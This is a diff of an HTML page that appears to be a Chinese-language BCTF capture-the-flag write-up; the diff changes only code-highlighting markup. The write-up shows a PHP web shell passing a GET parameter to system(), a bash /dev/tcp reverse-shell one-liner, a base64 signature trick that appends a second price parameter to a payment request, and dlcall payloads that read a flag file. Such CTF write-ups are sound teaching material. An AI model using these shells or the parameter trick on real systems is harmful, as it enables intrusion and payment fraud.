@@ -78,15 +78,14 @@
 
 <p>这个ip访问到的内容是</p>
 
-<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="c">&lt;!--
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--
 header("Access-Control-Allow-Origin: *");
 $ztz= 'system';
 ob_start($ztz);
 echo $_GET[c];
 ob_end_flush();
 --&gt;</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>没有回显，需要反弹shell，使用<code class="highlighter-rouge">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>的没反应，猜测是遇到了编码的坑，换用了wget一个python脚本然后执行，然后反弹就成功了。</p>
 
@@ -99,7 +98,7 @@ ob_end_flush();
 
 <p>后来在想到需要利用Python的base64解码的特点，</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="kn">import</span> <span class="nn">base64</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">In</span> <span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="kn">import</span> <span class="nn">base64</span>
 
 <span class="n">In</span> <span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s">"xxxxxxxxxx"</span><span class="p">)</span>
 <span class="n">Out</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="s">'eHh4eHh4eHh4eA=='</span>
@@ -112,18 +111,16 @@ ob_end_flush();
 
 <span class="n">In</span> <span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s">"eHh4eHh4eHh4eA==!eHh4eHh4eHh4eA=="</span><span class="p">)</span>
 <span class="n">Out</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="s">'xxxxxxxxxx'</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>这样把price放在最后面就可以了。</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="k">print</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://paygate.godric.me/pay"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">"orderID=12368911859&amp;price=80000&amp;productID=1&amp;timestamp=1458482306973&amp;signer=RSA&amp;hash=sha256&amp;nonce=733d2f88ea74af8a&amp;sign=TzdQaIa7qT/tTb6UNvzl25irdxiFYOj3hq932Wdozzkazsj1cIpzEhE2mnrUewwnuG2lPGpulqdMTGgMJgsUYWrKxEjpk3EKnWukgASyfap9N9EcsgKw67/2wJ00o1Nxc098jTxurLnW2lBfSXNQySDI+M7o0NzD58nYq/Rjzl3NkYFlF+fTf+ZxejM0J+uZCDDi7BZoFhTpFXrV0OPso6Ltefb+o0ZvI6YcBULHRdOVIhzhhnkY68xTBI2ULAH0OEttDls7PlLZnEYYuT92oSr7Q38W6ilpe1EG27czkVCVbuK3AMvfwaLbQnajuOrNz+JumG7TdFSbkwl8Rfgarw==!&amp;price=-1"</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
-</code></pre>
-</div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://paygate.godric.me/pay"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s">"orderID=12368911859&amp;price=80000&amp;productID=1&amp;timestamp=1458482306973&amp;signer=RSA&amp;hash=sha256&amp;nonce=733d2f88ea74af8a&amp;sign=TzdQaIa7qT/tTb6UNvzl25irdxiFYOj3hq932Wdozzkazsj1cIpzEhE2mnrUewwnuG2lPGpulqdMTGgMJgsUYWrKxEjpk3EKnWukgASyfap9N9EcsgKw67/2wJ00o1Nxc098jTxurLnW2lBfSXNQySDI+M7o0NzD58nYq/Rjzl3NkYFlF+fTf+ZxejM0J+uZCDDi7BZoFhTpFXrV0OPso6Ltefb+o0ZvI6YcBULHRdOVIhzhhnkY68xTBI2ULAH0OEttDls7PlLZnEYYuT92oSr7Q38W6ilpe1EG27czkVCVbuK3AMvfwaLbQnajuOrNz+JumG7TdFSbkwl8Rfgarw==!&amp;price=-1"</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+</code></pre></div></div>
 
 <p>验证代码取到的sign就是带有<code class="highlighter-rouge">!&amp;price=-1</code>的，但是base64解码后还和原来的是一样的，而解析price的时候却会读取到最后一个price。</p>
 
-<p>结果是<code class="highlighter-rouge"><span class="p">{</span><span class="nt">"status"</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="nt">"data"</span><span class="p">:</span><span class="w"> </span><span class="s2">"BCTF{0DayL0veR1chGuy5}"</span><span class="p">}</span></code></p>
+<p>结果是<code class="highlighter-rouge">{"status": 4, "data": "BCTF{0DayL0veR1chGuy5}"}</code></p>
 
 <h2 id="hsab">hsab</h2>
 <p>一开始需要跑一段hash，还是需要暴力，不过还是挺快的。</p>
@@ -134,7 +131,7 @@ ob_end_flush();
 binary starts with 20 bits of zeros.</p>
 </blockquote>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">urandom</span>
@@ -149,8 +146,7 @@ binary starts with 20 bits of zeros.</p>
     <span class="k">if</span> <span class="n">sha256</span><span class="p">(</span><span class="n">t</span> <span class="o">+</span> <span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'00000'</span><span class="p">):</span>
         <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">t</span> <span class="o">+</span> <span class="n">x</span><span class="o">+</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
         <span class="k">break</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>之后发现里面很多命令都没有了，比如<code class="highlighter-rouge">ls</code>、<code class="highlighter-rouge">cat</code>等，包括<code class="highlighter-rouge">gcc</code>、<code class="highlighter-rouge">python</code>之类的。之后发现输入<code class="highlighter-rouge">help</code>可以看到所有的命令。</p>
 
@@ -162,12 +158,11 @@ binary starts with 20 bits of zeros.</p>
 
 <p>后来听说还可以用用<code class="highlighter-rouge">dlcall</code>，但是我从没见过，只有https://github.com/taviso/ctypes.sh/wiki上有些介绍，看样子和C语言语法很像，但是写起来很奇怪。最终的payload是</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'dlcall -n file -r pointer fopen "/home/ctf/flag.ray" "r"</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'dlcall -n file -r pointer fopen "/home/ctf/flag.ray" "r"</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'dlcall -n content -r pointer malloc 128</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'dlcall -n text fread $content 128 1 $file</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'dlcall printf $text</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 
         <section class="author-detail">
